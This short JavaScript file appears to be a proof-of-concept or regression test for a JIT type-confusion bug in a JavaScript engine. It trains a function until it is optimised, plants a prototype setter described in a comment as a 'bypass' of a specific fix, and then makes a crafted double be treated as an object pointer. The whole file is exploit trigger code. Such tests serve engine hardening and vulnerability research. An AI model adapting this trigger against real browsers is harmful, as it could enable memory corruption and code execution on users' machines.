function opt(arr, a, b){
    arr[0] = 2.3023e-320
    a[b] = 1 
    arr[0] = 2.3023e-320
}

var arr = [1.1]
for(let i =0; i<1000;i++){
    opt(arr, {}, 'a')
}

({}).__proto__.__defineSetter__('raiseNeedObjectOfType', function(){arr[0]={}}); // bypass 76275c2117e51e98aeb09f42824d3175ce7004bb 

opt(arr, [], 'values')

arr[0].toString()

console.log('pass');
